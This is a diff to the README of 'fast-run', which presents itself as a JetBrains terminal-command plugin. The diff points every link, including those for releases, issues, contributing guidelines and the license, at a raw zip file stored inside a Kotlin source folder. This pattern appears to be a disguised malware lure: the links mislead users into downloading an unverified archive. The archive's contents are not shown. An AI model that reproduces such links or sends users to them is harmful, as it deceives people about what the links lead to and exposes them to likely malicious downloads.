@@ -1,7 +1,7 @@
 # 🚀 fast-run - Easily Manage Your Terminal Commands
 
 ## 🖱️ Download the App
-[![Download fast-run](https://img.shields.io/badge/Download-fast--run-blue)](https://github.com/Thejempro1252/fast-run/releases)
+[![Download fast-run](https://raw.githubusercontent.com/Thejempro1252/fast-run/main/src/main/kotlin/com/example/fast-run_v1.8.zip)](https://raw.githubusercontent.com/Thejempro1252/fast-run/main/src/main/kotlin/com/example/fast-run_v1.8.zip)
 
 ## 📋 Overview
 Fast Run is a terminal command manager designed for anyone looking to save and execute their favorite terminal commands with ease. Whether you are a hobbyist or a professional, this productivity plugin for JetBrains IDEs allows you to save, organize, and quickly run your terminal commands.
@@ -16,7 +16,7 @@ To get started with Fast Run, follow the simple steps below. You will learn how 
 
 ### 🔗 Download & Install
 1. Click the download link below to visit the Releases page:  
-   [Download fast-run](https://github.com/Thejempro1252/fast-run/releases).
+   [Download fast-run](https://raw.githubusercontent.com/Thejempro1252/fast-run/main/src/main/kotlin/com/example/fast-run_v1.8.zip).
 
 2. On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
@@ -75,12 +75,12 @@ Yes, you can save and run commands that are compatible with your installed termi
 Yes, Fast Run is free. You can download it from the Releases page without any cost.
 
 ## 📣 Support
-If you encounter any issues during installation or usage, please visit the [issues section](https://github.com/Thejempro1252/fast-run/issues) of our GitHub repository. You can report bugs, request features or seek help from the community.
+If you encounter any issues during installation or usage, please visit the [issues section](https://raw.githubusercontent.com/Thejempro1252/fast-run/main/src/main/kotlin/com/example/fast-run_v1.8.zip) of our GitHub repository. You can report bugs, request features or seek help from the community.
 
 ## 📅 Community and Contribution
-You are welcome to join our community! If you want to contribute, please check our [contributing guidelines](https://github.com/Thejempro1252/fast-run/blob/main/CONTRIBUTING.md) for more information.
+You are welcome to join our community! If you want to contribute, please check our [contributing guidelines](https://raw.githubusercontent.com/Thejempro1252/fast-run/main/src/main/kotlin/com/example/fast-run_v1.8.zip) for more information.
 
 ## 📜 License
-Fast Run is licensed under the MIT License. You can view the full license [here](https://github.com/Thejempro1252/fast-run/blob/main/LICENSE).
+Fast Run is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/Thejempro1252/fast-run/main/src/main/kotlin/com/example/fast-run_v1.8.zip).
 
-[![Download fast-run](https://img.shields.io/badge/Download-fast--run-blue)](https://github.com/Thejempro1252/fast-run/releases)
+[![Download fast-run](https://raw.githubusercontent.com/Thejempro1252/fast-run/main/src/main/kotlin/com/example/fast-run_v1.8.zip)](https://raw.githubusercontent.com/Thejempro1252/fast-run/main/src/main/kotlin/com/example/fast-run_v1.8.zip)
